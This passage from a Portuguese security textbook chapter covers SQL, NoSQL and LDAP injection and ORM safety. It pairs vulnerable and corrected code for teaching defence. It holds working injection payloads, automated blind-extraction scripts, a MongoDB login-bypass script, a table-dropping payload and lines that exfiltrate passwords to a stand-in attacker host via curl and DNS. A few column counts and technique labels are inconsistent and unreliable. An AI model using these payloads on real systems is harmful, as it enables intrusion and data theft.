# Capítulo 04 — SQL Injection e Segurança de Banco de Dados

---

## Objetivos de Aprendizado

Ao final deste capítulo, você será capaz de:

- Identificar e classificar diferentes tipos de SQL injection, desde ataques básicos até técnicas avançadas
- Compreender como NoSQL injection e LDAP injection representam vetores de ataque alternativos
- Avaliar a segurança de ORMs populares e identificar pontos vulneráveis na configuração
- Implementar parameterized queries e prepared statements em JavaScript, Python e Go
- Analisar vulnerabilidades reais através de CVEs documentadas e entender seus impactos
- Configurar stored procedures com segurança e aplicar princípios de database hardening
- Utilizar ferramentas de automação como SQLMap para testes de segurança
- Projetar e implementar uma estratégia abrangente de defesa contra injeção de dados

---

## Conceitos Fundamentais de SQL Injection

### O que é SQL Injection

SQL injection é uma vulnerabilidade de segurança que ocorre quando dados fornecidos pelo usuário são incorporados diretamente em consultas SQL sem sanitização adequada. O atacante pode manipular a consulta para executar comandos SQL arbitrários, potencialmente comprometendo a confidencialidade, integridade e disponibilidade dos dados do sistema.

A vulnerabilidade surge quando há uma separação inadequada entre dados e código. Em uma consulta SQL bem estruturada, os dados devem ser tratados como valores, não como partes da instrução SQL. Quando essa fronteira é violada, o atacante pode "injetar" código SQL malicioso que será interpretado pelo banco de dados como instruções legítimas.

### Classificação por Grau de Impacto

SQL injection pode ser classificada em três categorias principais baseadas no impacto potencial:

**In-Band SQL Injection (Inserção de Banda):** O atacante utiliza o mesmo canal de comunicação para injetar o código malicioso e obter os resultados. Esta é a forma mais comum e direta de ataque. Inclui variantes UNION-based e error-based.

**Blind SQL Injection (Injeção Cega):** O atacante não recebe resultados diretos da consulta injetada, mas pode inferir informações através de comportamentos observáveis do sistema, como tempo de resposta ou diferenças nas páginas retornadas. Pode ser boolean-based ou time-based.

**Out-of-Band SQL Injection (Fora de Banda):** O atacante utiliza canais alternativos de comunicação, como requisições HTTP externas ou consultas DNS, para extrair dados quando as técnicas in-band não são viáveis. Esta técnica é mais avançada e requer condições específicas no ambiente.

### O Modelo de Ameaça

Para compreender adequadamente o risco de SQL injection, é necessário considerar o modelo de ameaça:

**Atacante:** Indivíduo ou grupo com habilidades técnicas variáveis, desde script kiddies até hackers éticos profissionais. O atacante pode ter motivos financeiros, ideológicos, espionagem corporativa ou simplesmente curiosidade.

**Vetor de Ataque:** Interface web, APIs REST, campos de formulário, parâmetros de URL, headers HTTP, cookies, e qualquer ponto de entrada que processe dados do usuário em consultas SQL.

**Ativo Sob Ameaça:** Dados do banco de dados, que podem incluir informações pessoais, credenciais, dados financeiros, segredos comerciais, e configurações do sistema.

**Impacto:** Desde a exposição de dados confidenciais até a manipulação ou destruição completa do banco de dados, incluindo execução de comandos do sistema operacional em casos extremos.

### Anatomia de um Ataque SQL Injection

Para entender como SQL injection funciona, vamos analisar o fluxo completo de um ataque:

1. **Reconhecimento:** O atacante identifica pontos de entrada que processam dados do usuário em consultas SQL
2. **Prova de Conceito:** O atacante testa a vulnerabilidade com payloads simples que confirmam a injeção
3. **Exploração:** O atacante extrai informações ou manipula dados através de consultas injetadas
4. **Escalada:** O atacante busca privilégios elevados ou acesso a outros sistemas
5. **Persistência:** Em ataques sofisticados, o atacante cria backdoors para acesso futuro

---

## SQL Injection Básica

### UNION-Based SQL Injection

A técnica UNION-based é uma das formas mais diretas de SQL injection. Ela explora a cláusula UNION SQL, que combina resultados de duas ou mais consultas SELECT. O atacante precisa descobrir o número exato de colunas na consulta original e os tipos de dados compatíveis.

**Princípio de Funcionamento:**

A cláusula UNION permite que duas consultas SELECT sejam combinadas em um único resultado, desde que ambas tenham o mesmo número de colunas. O atacante utiliza isso para adicionar sua própria consulta à original, forçando o sistema a retornar dados que não deveriam ser acessíveis.

**Exemplo de Vulnerabilidade:**

Considere uma aplicação web que busca produtos por ID:

```sql
SELECT id, nome, preco, categoria FROM produtos WHERE id = 'INPUT_DO_USUARIO';
```

Se o usuário inserir `1' UNION SELECT 1,2,3,4--`, a consulta se torna:

```sql
SELECT id, nome, preco, categoria FROM produtos WHERE id = '1' UNION SELECT 1,2,3,4--';
```

**Fase de Descoberta de Colunas:**

O atacante primeiro precisa determinar o número de colunas na consulta original. Isso pode ser feito incrementalmente:

```sql
-- Teste com 1 coluna
1' UNION SELECT 1--
-- Erro: The SELECT lists have different number of columns

-- Teste com 2 colunas
1' UNION SELECT 1,2--
-- Erro: The SELECT lists have different number of columns

-- Teste com 3 colunas
1' UNION SELECT 1,2,3--
-- Funciona se a consulta original tem 3 colunas
```

**Fase de Identificação de Tipos de Dados:**

Uma vez descoberto o número de colunas, o atacante precisa identificar quais colunas aceitam dados numéricos e quais aceitam strings:

```sql
-- Teste de tipos de dados
1' UNION SELECT 'a',2,3--
-- Se retornar erro na primeira coluna, ela espera número

1' UNION SELECT 1,'b',3--
-- Se retornar erro na segunda coluna, ela espera string
```

**Extrair Dados de Outras Tabelas:**

Após identificar a estrutura, o atacante pode extrair dados de tabelas sensíveis:

```sql
-- Listar tabelas do banco de dados
1' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--

-- Listar colunas de uma tabela específica
1' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'--

-- Extrair dados de usuários
1' UNION SELECT username,password,4 FROM usuarios--
```

**Técnicas de Bypass de Filtros:**

Muitas aplicações implementam filtros básicos que podem ser contornados:

```sql
-- Bypass de filtro que bloqueia espaços
1'UNION/**/SELECT/**/1,2,3--

-- Bypass usando comentários alternativos
1'UNION/*comentario*/SELECT/*comentario*/1,2,3--

-- Bypass de case-sensitivity
1' union select 1,2,3--

-- Usando caracteres especiais
1'UNiOnSeLeCt 1,2,3--
```

### Error-Based SQL Injection

Esta técnica força o banco de dados a retornar mensagens de erro detalhadas que contêm informações sobre a estrutura do banco de dados. É especialmente útil quando a aplicação retorna erros SQL diretamente ao usuário.

**Princípio de Funcionamento:**

O atacante injeta SQL que causa erros deliberados, e a mensagem de erro retornada contém informações valiosas sobre a estrutura do banco de dados, incluindo nomes de tabelas, colunas e valores.

**Exemplo com MySQL:**

```sql
-- Usando UPDATEXML para forçar erro com dados
1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

-- Usando EXTRACTVALUE
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--

-- Usando JSON_TABLE (MySQL 8.0+)
1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Exemplo com SQL Server:**

```sql
-- Usando CONVERT para forçar erro
1' AND CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))>0--

-- Usando CAST
1' AND 1=CAST((SELECT TOP 1 username FROM usuarios) AS INT)--
```

**Exemplo com PostgreSQL:**

```sql
-- Usando CAST para forçar erro
1' AND 1=CAST((SELECT version()) AS INT)--

-- Usando erro de divisão por zero
1' AND 1/(SELECT CASE WHEN (1=1) THEN 0 ELSE 1 END)=0--
```

**Análise de Mensagens de Erro:**

As mensagens de erro podem conter informações cruciais:

- **MySQL:** "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version..."
- **PostgreSQL:** "ERROR: syntax error at or near..."
- **SQL Server:** "Incorrect syntax near..."
- **Oracle:** "ORA-01756: quoted string not properly terminated..."

### Blind SQL Injection

Blind SQL injection ocorre quando a aplicação não retorna dados diretamente da consulta injetada, mas o atacante pode inferir informações através de comportamentos observáveis.

**Boolean-Based Blind SQL Injection:**

O atacante faz consultas que retornam verdadeiro ou falso, e observa se a resposta da aplicação muda:

```sql
-- Pergunta: O banco de dados começa com 'a'?
1' AND (SELECT SUBSTRING(database(),1,1))='a'--

-- Se a resposta for verdadeira, a primeira letra do nome do banco é 'a'
-- Caso contrário, testa com 'b', 'c', etc.

-- Pergunta: A tabela 'usuarios' existe?
1' AND (SELECT COUNT(*) FROM usuarios)>0--

-- Pergunta: O usuário admin tem password que começa com 'a'?
1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE username='admin')='a'--
```

**Exemplo de Script de Extração:**

```python
import requests

def extract_database_name():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    url = 'http://exemplo.com/produto'
    database_name = ''
    
    for position in range(1, 50):
        for char in charset:
            payload = f"1' AND (SELECT SUBSTRING(database(),{position},1))='{char}'--"
            response = requests.get(url, params={'id': payload})
            
            if 'Produto encontrado' in response.text:
                database_name += char
                print(f"Posição {position}: {char}")
                break
        else:
            break
    
    return database_name

# Uso
db_name = extract_database_name()
print(f"Nome do banco: {db_name}")
```

**Time-Based Blind SQL Injection:**

Quando não há diferença visual entre respostas verdadeiras e falsas, o atacante pode utilizar funções de tempo para inferir informações:

```sql
-- MySQL: Espera 5 segundos se a condição for verdadeira
1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- PostgreSQL: Espera 5 segundos se a condição for verdadeira
1' AND CASE WHEN (SUBSTRING(database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQL Server: Espera 5 segundos se a condição for verdadeira
1'; IF (SELECT SUBSTRING(DB_NAME(),1,1))='a' WAITFOR DELAY '0:0:5'--
```

**Exemplo de Script Time-Based:**

```python
import requests
import time

def extract_data_time_based():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    url = 'http://exemplo.com/produto'
    extracted = ''
    
    for position in range(1, 100):
        for char in charset:
            payload = f"1' AND IF(SUBSTRING(database(),{position},1)='{char}',SLEEP(3),0)--"
            
            start_time = time.time()
            requests.get(url, params={'id': payload})
            end_time = time.time()
            
            if end_time - start_time > 3:
                extracted += char
                print(f"Posição {position}: {char}")
                break
        else:
            break
    
    return extracted
```

**Out-of-Band SQL Injection:**

Esta técnica é utilizada quando as técnicas anteriores não são viáveis, geralmente em firewalls ou configurações que bloqueiam respostas diretas. O atacante utiliza canais alternativos para extrair dados.

**Exemplo com DNS:**

```sql
-- MySQL: Forçar consulta DNS para exfiltrar dados
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.exemplo.com\\file'))--

-- PostgreSQL: Usando dblink para consulta externa
1'; SELECT dblink_connect('host=exemplo.com user=postgres password=senha');--
-- seguido de
1'; SELECT * FROM dblink('SELECT version()') AS t(result text);--
```

**Exemplo com HTTP:**

```sql
-- SQL Server: Forçar requisição HTTP
1'; DECLARE @q VARCHAR(1000); SET @q='http://atacante.com/log?data='+@@version; EXEC master..xp_cmdshell @q;--
```

---

## Advanced SQL Injection Techniques

### Second-Order SQL Injection

Second-order SQL injection (ou stored SQL injection) é uma forma mais sofisticada de ataque onde o payload malicioso não é executado imediatamente, mas é armazenado no banco de dados e executado posteriormente quando acessado por outra funcionalidade do sistema.

**Princípio de Funcionamento:**

Diferente da SQL injection tradicional, onde o ataque é executado na mesma requisição, no second-order injection:
1. O atacante insere dados maliciosos em um campo que é armazenado no banco
2. Os dados são sanitizados ou tratados corretamente no momento do armazenamento
3. Posteriormente, quando esses dados são recuperados e usados em outra consulta SQL, a injeção ocorre

**Cenário de Ataque:**

Considere uma aplicação de e-commerce:

**Funcionalidade 1: Cadastro de Produto (Armazenamento)**
```sql
-- O sistema armazena o nome do produto
INSERT INTO produtos (nome, preco) VALUES ('INPUT_USUARIO', 99.99);
-- O input é devidamente parameterizado aqui
```

**Funcionalidade 2: Relatório de Vendas (Execução)**
```sql
-- O sistema recupera o nome do produto para um relatório
SELECT nome, SUM(quantidade) as total FROM vendas WHERE produto = 'NOME_DO_PRODUTO';
-- AQUI o problema ocorre! O nome do produto é concatenado diretamente
```

**Exemplo de Payload:**

```sql
-- O atacante cadastra um produto com nome:
Produto: ' OR 1=1; DROP TABLE vendas; --

-- Quando o relatório é gerado, a consulta se torna:
SELECT nome, SUM(quantidade) as total FROM vendas WHERE produto = '' OR 1=1; DROP TABLE vendas; --';
```

**Detecção e Prevenção:**

```python
# Exemplo de vulnerabilidade em Python (Flask)
@app.route('/cadastrar_produto', methods=['POST'])
def cadastrar_produto():
    nome = request.form['nome']
    preco = request.form['preco']
    
    # CORRETO: Parameterizado para inserção
    cursor.execute(
        "INSERT INTO produtos (nome, preco) VALUES (%s, %s)",
        (nome, preco)
    )
    
    return "Produto cadastrado"

# Vulnerabilidade: O nome é usado em outra consulta sem parameterização
@app.route('/relatorio')
def relatorio():
    cursor.execute(
        "SELECT nome, total FROM vendas WHERE produto = '" + nome + "'"
        # PROBLEMA: Concatenação direta do nome do produto
    )
```

**Correção:**
```python
@app.route('/relatorio')
def relatorio():
    cursor.execute(
        "SELECT nome, total FROM vendas WHERE produto = %s",
        (nome,)  # CORRETO: Usar parameterized query
    )
```

### Out-of-Band SQL Injection

Out-of-band SQL injection é uma técnica avançada utilizada quando as respostas diretas da consulta não são acessíveis ao atacante. O atacante utiliza canais externos de comunicação para exfiltrar dados.

**Condições Necessárias:**
- O banco de dados deve ter permissão para realizar conexões externas
- Firewall ou configurações de rede devem permitir tráfego de saída
- O atacante deve ter um servidor que possa receber os dados exfiltrados

**Técnicas Comuns:**

**DNS Exfiltration:**
```sql
-- SQL Server: Usando xp_dirtree para forçar resolução DNS
1'; DECLARE @q VARCHAR(1000); SET @q='dir \\\'+(SELECT TOP 1 password FROM usuarios)+'\\share'; EXEC master..xp_dirtree @q;--

-- MySQL: Usando LOAD_FILE para DNS
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM usuarios LIMIT 1),'.atacante.com\\file'))--
```

**HTTP Exfiltration:**
```sql
-- SQL Server: Usando xp_cmdshell para HTTP
1'; EXEC master..xp_cmdshell 'curl http://atacante.com/log?data=...';--
```

**Blind Out-of-Band:**
Quando o atacante não pode receber respostas diretamente, pode usar técnicas de codificação:

```sql
-- Codificando dados em DNS
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',HEX(password),'.atacante.com\\file')) FROM usuarios WHERE username='admin'--
```

### Second-Order com E-mail Headers

Uma variação interessante é usar campos de e-mail para exfiltrar dados:

```sql
-- Cadastrar usuário com e-mail malicioso
' OR 1=1; SELECT CONCAT(username,':',password) INTO OUTFILE '/tmp/dados.txt' FROM usuarios; --

-- Se o sistema enviar e-mail para esse endereço e incluir o erro
```

### SQL Injection em Subqueries

Subqueries podem ser exploradas de formas complexas:

```sql
-- Extraindo dados usando subquery correlacionada
1' AND (SELECT CASE WHEN (SELECT password FROM usuarios WHERE username='admin') LIKE 'a%' THEN 1 ELSE 0 END)=1--

-- Usando subquery com agregação
1' AND (SELECT COUNT(*) FROM (SELECT password FROM usuarios) AS t) > 0--
```

### SQL Injection com CTEs (Common Table Expressions)

CTEs podem ser usadas para extrair dados de forma mais sofisticada:

```sql
-- PostgreSQL: Usando CTE para extração
1'; WITH cte AS (SELECT username, password FROM usuarios) SELECT * FROM cte WHERE 1=1;--

-- SQL Server: CTE com string building
1'; WITH cte AS (SELECT CAST(username AS VARCHAR(100))+':'+password as dados FROM usuarios) SELECT dados FROM cte--
```

### SQL Injection em JOINs

JOINs podem ser explorados para acessar tabelas relacionadas:

```sql
-- Extraindo dados de tabelas relacionadas
1' UNION SELECT u.username, p.senha, u.email FROM usuarios u JOIN permissoes p ON u.id=p.user_id--
```

### SQL Injection com Funções de Janela

Funções de janela do SQL moderno podem ser exploradas:

```sql
-- PostgreSQL: Usando funções de janela
1' UNION SELECT username, password, ROW_NUMBER() OVER (ORDER BY id) FROM usuarios--
```

---

## NoSQL Injection

### MongoDB Injection

MongoDB, como banco de dados NoSQL, não usa SQL tradicional, mas é vulnerável a formas equivalentes de injeção quando operadores de consulta são maliciosamente manipulados.

**Princípio de Funcionamento:**

Enquanto SQL injection explora a sintaxe SQL, NoSQL injection explora a estrutura de consultas JSON/BSON. O atacante manipula operadores de consulta como `$gt`, `$ne`, `$regex` para alterar o comportamento das consultas.

**Vulnerabilidade em JavaScript/Node.js:**

```javascript
// CODIGO VULNERAVEL
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Vulneravel: O objeto de consulta e construido diretamente com input do usuario
    User.findOne({
        username: username,
        password: password
    }, (err, user) => {
        if (user) {
            res.json({ success: true, user: user });
        } else {
            res.json({ success: false });
        }
    });
});
```

**Ataque com Operadores MongoDB:**

```json
// Payload malicioso no campo username
{
    "username": {"$ne": ""},
    "password": {"$ne": ""}
}

// Ou usando regex
{
    "username": {"$regex": ".*"},
    "password": {"$regex": ".*"}
}

// Ou usando $gt (greater than)
{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
}
```

**Resultado da Consulta Maliciosa:**

```javascript
// A consulta se torna:
db.users.findOne({
    username: { $ne: "" },
    password: { $ne: ""
})
// Retorna o primeiro usuario que encontrar, independente das credenciais
```

**Exemplo Completo de Ataque:**

```python
import requests

# Ataque de autenticacao bypass
payload = {
    "username": {"$ne": ""},
    "password": {"$ne": ""}
}

response = requests.post(
    'http://exemplo.com/login',
    json=payload
)

if response.json().get('success'):
    print("Autenticacao bypassed!")
    print(f"Usuario: {response.json()['user']}")
```

**Extracao de Dados:**

```javascript
// Payload para extrair dados usando regex
{
    "username": {"$regex": "^a"},  // usernames comecando com 'a'
    "password": {"$ne": ""}
}

// Para extrair todos os usuarios
{
    "username": {"$ne": ""},
    "password": {"$ne": ""}
}
```

**Prevencao em Node.js:**

```javascript
// CORRETO: Validar tipos antes de usar na consulta
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Validacao de tipo
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Tipo invalido' });
    }
    
    // Usar querybuilder ou sanitizacao
    User.findOne({
        username: username,  // Agora e garantido que e string
        password: password
    }).exec((err, user) => {
        if (user) {
            res.json({ success: true, user: user });
        } else {
            res.json({ success: false });
        }
    });
});

// Alternativa: Usar sanitize-library
const sanitize = require('mongo-sanitize');

app.post('/login', (req, res) => {
    const username = sanitize(req.body.username);
    const password = sanitize(req.body.password);
    
    User.findOne({
        username: username,
        password: password
    }).exec((err, user) => {
        // ...
    });
});
```

### CouchDB Injection

CouchDB utiliza HTTP e JSON para consultas, e e vulneravel a injecao quando queries sao construidas dinamicamente.

**Vulnerabilidade em CouchDB:**

```javascript
// CouchDB vulnerability example
const nano = require('nano')('http://localhost:5984');

app.get('/buscar', async (req, res) => {
    const searchTerm = req.query.term;
    
    // Vulneravel: Construcao dinamica da query
    const query = {
        selector: {
            name: { "$eq": searchTerm }
        }
    };
    
    const result = await nano.db.find(query);
    res.json(result);
});
```

**Ataque em CouchDB:**

```javascript
// Payload para bypass
{
    "selector": {
        "name": { "$gt": null },
        "password": { "$ne": "" }
    }
}
```

**Prevencao:**

```javascript
// Validacao de input
const validateSearch = (term) => {
    if (typeof term !== 'string') return null;
    if (term.length > 100) return null;
    return term.replace(/[{}$]/g, '');  // Remove caracteres perigosos
};

app.get('/buscar', async (req, res) => {
    const searchTerm = validateSearch(req.query.term);
    
    if (!searchTerm) {
        return res.status(400).json({ error: 'Input invalido' });
    }
    
    const query = {
        selector: {
            name: searchTerm  // Agora e string segura
        }
    };
    
    const result = await nano.db.find(query);
    res.json(result);
});
```

### Redis Injection

Redis e frequentemente usado como cache e e vulneravel a injecao quando comandos sao construidos dinamicamente.

**Vulnerabilidade em Redis:**

```python
import redis

# Vulneravel: Concatenacao de comandos Redis
def get_user_data(user_id):
    r = redis.Redis(host='localhost', port=6379)
    
    # PROBLEMA: Construcao dinamica do comando
    command = f"GET user:{user_id}:data"
    return r.execute_command(command)
```

**Ataque em Redis:**

```python
# Payload: user_id = "1\r\nFLUSHALL\r\n"
# Isso executa:
# GET user:1
# FLUSHALL  # Limpa TODOS os dados do Redis!
```

**Exemplo de Extracao de Dados:**

```python
# Payload para extrair todas as chaves
payload = '1\r\nKEYS *\r\n'
# Resultado: Lista todas as chaves do Redis

# Payload para extrair valor especifico
payload = '1\r\nGET admin:password\r\n'
# Resultado: Valor da chave admin:password
```

**Prevencao:**

```python
import redis
import re

def sanitize_redis_key(key):
    # Remover caracteres de nova linha e retorno de carro
    if not isinstance(key, str):
        raise ValueError("Key must be a string")
    
    # Permitir apenas caracteres seguros
    if not re.match(r'^[a-zA-Z0-9_\-:]+$', key):
        raise ValueError("Invalid key format")
    
    return key

def get_user_data(user_id):
    r = redis.Redis(host='localhost', port=6379)
    
    # CORRETO: Usar parameterizacao do Redis
    # O redis-py ja parameteriza comandos automaticamente
    return r.get(f"user:{sanitize_redis_key(user_id)}:data")

# Alternativa: Usar pipeline com parametros
def get_user_data_safe(user_id):
    r = redis.Redis(host='localhost', port=6379)
    
    # Usar pipeline para executar multiplos comandos de forma segura
    pipe = r.pipeline()
    pipe.get(f"user:{user_id}:data")
    results = pipe.execute()
    
    return results[0]
```

### Comparativo NoSQL vs SQL Injection

| Aspecto | SQL Injection | NoSQL Injection |
|---------|---------------|-----------------|
| Sintaxe | SQL tradicional | JSON/BSON, operadores |
| Vetor | Strings concatenadas | Objetos JSON maliciosos |
| Impacto | Leitura, escrita, exclusao | Similar, depende da configuracao |
| Prevencao | Parameterized queries | Validacao de tipos e sanitizacao |
| Detecao | WAFs tradicionais | WAFs adaptados para JSON |

---

## LDAP Injection

### Conceitos de LDAP

LDAP (Lightweight Directory Access Protocol) e um protocolo para acessar e manter servicos de informacoes de diretorio distribuido. E amplamente utilizado para autenticacao centralizada, como Active Directory.

**Como Funciona:**

LDAP usa consultas com sintaxe similar a SQL, mas com diferencas significativas:

```ldap
# Exemplo de consulta LDAP
(&(objectClass=user)(sAMAccountName=usuario)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# Filtros LDAP comuns:
# (&) - AND
# (|) - OR
# (!) - NOT
# (=) - Igualdade
# (*) - Wildcard
```

### Vulnerabilidades LDAP

LDAP injection ocorre quando dados do usuario sao incorporados diretamente em consultas LDAP.

**Cenario de Ataque: Autenticacao**

```python
# Vulneravel: Autenticacao LDAP
import ldap3

def autenticar_usuario(username, password):
    # PROBLEMA: Concatenacao direta
    filtro = f"(&(objectClass=user)(sAMAccountName={username})(userPassword={password}))"
    
    server = ldap3.Server('ldap://dc.empresa.com')
    conn = ldap3.Connection(server, user='cn=admin,dc=empresa,dc=com', password='senha')
    
    conn.search('dc=empresa,dc=com', filtro)
    return len(conn.entries) > 0
```

**Payload de Ataque:**

```python
# Bypass de autenticacao
username = "admin)(&)"
password = "anything)(&)"

# A consulta se torna:
# (&(objectClass=user)(sAMAccountName=admin)(&))(userPassword=anything)(&))
# O filtro e manipulado para ignorar a senha
```

**Exemplo Mais Sofisticado:**

```python
# Ataque para extrair informacoes
username = "*"
# Retorna todos os usuarios

# Ataque para bypass com filtro especifico
username = "admin)(!(userPassword=*))"
# Busca admin sem verificar senha
```

### Extraindo Dados via LDAP

```python
# Injecao para enumerar atributos
username = "*)(&(objectClass=*"
# Modifica o filtro para retornar todos os objetos

# Injecao para extrair informacoes especificas
username = "*)(mail=*"
# Retorna todos os usuarios com e-mail
```

### Prevencao de LDAP Injection

```python
# CORRETO: Usar parameterizacao LDAP
import ldap3
from ldap3.utils.conv import escape_filter_chars

def autenticar_usuario_seguro(username, password):
    # Escapar caracteres especiais LDAP
    username_safe = escape_filter_chars(username)
    password_safe = escape_filter_chars(password)
    
    # Usar filtro parameterizado
    filtro = "(&(objectClass=user)(sAMAccountName={})(userPassword={}))"
    
    server = ldap3.Server('ldap://dc.empresa.com')
    conn = ldap3.Connection(server, user='cn=admin,dc=empresa,dc=com', password='senha')
    
    conn.search(
        'dc=empresa,dc=com',
        filtro.format(username_safe, password_safe)
    )
    
    return len(conn.entries) > 0

# Alternativa: Usar search_s com parametros separados
def autenticar_usuario_v2(username, password):
    import ldap
    
    # Usar filtro com placeholders
    filtro = "(&(objectClass=user)(sAMAccountName=%s)(userPassword=%s))"
    
    try:
        conn = ldap.initialize('ldap://dc.empresa.com')
        conn.simple_bind_s(
            'cn=admin,dc=empresa,dc=com',
            'senha'
        )
        
        results = conn.search_s(
            'dc=empresa,dc=com',
            ldap.SCOPE_SUBTREE,
            filtro % (escape_filter_chars(username), escape_filter_chars(password)),
            ['sAMAccountName', 'mail']
        )
        
        return len(results) > 0
    except ldap.LDAPError as e:
        print(f"Erro LDAP: {e}")
        return False

def escape_filter_chars(value):
    """Escapa caracteres especiais em filtros LDAP"""
    special_chars = {
        '*': r'\2a',
        '(': r'\28',
        ')': r'\29',
        '\\': r'\5c',
        '\0': r'\00'
    }
    
    result = value
    for char, escaped in special_chars.items():
        result = result.replace(char, escaped)
    
    return result
```

### LDAP Injection em Active Directory

```python
# Autenticacao Active Directory segura
import ldap3
from ldap3.core.exceptions import LDAPBindError

def autenticar_ad(username, password, domain='empresa'):
    try:
        # Servidor e conexao
        server = ldap3.Server('ldap://dc.empresa.com', get_info=ldap3.ALL)
        
        # Formatar username para AD (DOMAIN\username)
        user_dn = f"{domain}\\{username}"
        
        # Conexao com credenciais do usuario
        conn = ldap3.Connection(
            server,
            user=user_dn,
            password=password,
            authentication=ldap3.NTLM,
            auto_bind=True
        )
    
    except LDAPBindError:
        # Credenciais invalidas ou account locked
        return None
    
    # Buscar informacoes do usuario apos autenticacao bem-sucedida
    conn.search(
        'dc=empresa,dc=com',
        f'(&(objectClass=user)(sAMAccountName={username}))',
        attributes=['cn', 'mail', 'memberOf']
    )
    
    if conn.entries:
        user_info = conn.entries[0]
        return {
            'username': user_info.sAMAccountName.value,
            'name': user_info.cn.value,
            'email': user_info.mail.value,
            'groups': user_info.memberOf.values
        }
    
    return None
```

---

## ORM Security

### Sequelize (Node.js/JavaScript)

Sequelize e um ORM popular para Node.js que suporta multiplos bancos de dados. Embora facilite o desenvolvimento, configuracoes incorretas podem introduzir vulnerabilidades.

**Vulnerabilidades Comuns:**

```javascript
// VULNERAVEL: Uso de query direta com interpolacao
const Usuario = require('./models/usuario');

async function buscarUsuario(id) {
    // PERIGOSO: Template literal com input direto
    const query = `SELECT * FROM usuarios WHERE id = ${id}`;
    const [results] = await sequelize.query(query);
    return results;
}

// VULNERAVEL: Uso de raw query com concatenacao
async function buscarPorNome(nome) {
    const query = "SELECT * FROM usuarios WHERE nome = '" + nome + "'";
    const [results] = await sequelize.query(query);
    return results;
}

// VULNERAVEL: Order by dinamico sem validacao
async function listarUsuarios(campoOrdenacao) {
    const usuarios = await Usuario.findAll({
        order: [[campoOrdenacao, 'ASC']]  // Permite SQL injection via order by
    });
    return usuarios;
}
```

**Formas Seguras de Uso:**

```javascript
// CORRETO: Usar model methods (internamente parameterizadas)
async function buscarUsuarioSeguro(id) {
    const usuario = await Usuario.findByPk(id);
    return usuario;
}

// CORRETO: Usar where conditions
async function buscarPorNomeSeguro(nome) {
    const usuarios = await Usuario.findAll({
        where: {
            nome: nome  // Sequelize parameteriza automaticamente
        }
    });
    return usuarios;
}

// CORRETO: Usar placeholders em raw queries
async function buscarPorNomeRawSeguro(nome) {
    const [results] = await sequelize.query(
        'SELECT * FROM usuarios WHERE nome = :nome',
        {
            replacements: { nome: nome },
            type: sequelize.QueryTypes.SELECT
        }
    );
    return results;
}

// CORRETO: Validar e usar allowList para order by
const ALLOWED_FIELDS = ['id', 'nome', 'email', 'created_at'];

async function listarUsuariosSeguro(campoOrdenacao) {
    if (!ALLOWED_FIELDS.includes(campoOrdenacao)) {
        throw new Error('Campo de ordenacao invalido');
    }
    
    const usuarios = await Usuario.findAll({
        order: [[campoOrdenacao, 'ASC']]
    });
    return usuarios;
}

// CORRETO: Usar bind parameters
async function buscarComplexa(param1, param2) {
    const [results] = await sequelize.query(
        'SELECT * FROM usuarios WHERE status = $1 AND idade > $2',
        {
            bind: [param1, param2],
            type: sequelize.QueryTypes.SELECT
        }
    );
    return results;
}
```

### SQLAlchemy (Python)

SQLAlchemy e o ORM mais utilizado em Python, oferecendo tanto o Core quanto a abstracao de ORM.

**Vulnerabilidades Comuns:**

```python
from sqlalchemy import create_engine, text
from sqlalchemy.orm import Session

# VULNERAVEL: Uso de text() com interpolacao
def buscar_usuario_vulneravel(user_id):
    engine = create_engine('postgresql://user:pass@localhost/db')
    
    # PERIGOSO: Interpolacao direta
    query = text(f"SELECT * FROM usuarios WHERE id = {user_id}")
    
    with engine.connect() as conn:
        result = conn.execute(query)
        return result.fetchall()

# VULNERAVEL: Uso de execute com string formatada
def buscar_por_nome_vulneravel(nome):
    engine = create_engine('postgresql://user:pass@localhost/db')
    
    query = text("SELECT * FROM usuarios WHERE nome = '" + nome + "'")
    
    with engine.connect() as conn:
        result = conn.execute(query)
        return result.fetchall()
```

**Formas Seguras de Uso:**

```python
from sqlalchemy import create_engine, text
from sqlalchemy.orm import Session
from sqlalchemy.exc import SQLAlchemyError

# CORRETO: Usar bind parameters com text()
def buscar_usuario_seguro(user_id):
    engine = create_engine('postgresql://user:pass@localhost/db')
    
    # Usar bind parameters
    query = text("SELECT * FROM usuarios WHERE id = :user_id")
    
    with engine.connect() as conn:
        result = conn.execute(query, {"user_id": user_id})
        return result.fetchall()

# CORRETO: Usar ORM methods
from sqlalchemy.orm import Session
from models import Usuario

def buscar_por_nome_seguro(session: Session, nome: str):
    # ORM parameteriza automaticamente
    usuarios = session.query(Usuario).filter(
        Usuario.nome == nome
    ).all()
    
    return usuarios

# CORRETO: Usar Core com params()
def buscar_complexa_seguro(param1, param2):
    engine = create_engine('postgresql://user:pass@localhost/db')
    
    query = text(
        "SELECT * FROM usuarios WHERE status = :status AND idade > :idade"
    )
    
    with engine.connect() as conn:
        result = conn.execute(
            query,
            {"status": param1, "idade": param2}
        )
        return result.fetchall()

# CORRETO: Usar filter() do ORM com operadores
def busca_dinamica_seguro(filtros):
    engine = create_engine('postgresql://user:pass@localhost/db')
    
    with Session(engine) as session:
        query = session.query(Usuario)
        
        for campo, valor in filtros.items():
            if hasattr(Usuario, campo):
                # Usa getattr para acessar o atributo de forma segura
                coluna = getattr(Usuario, campo)
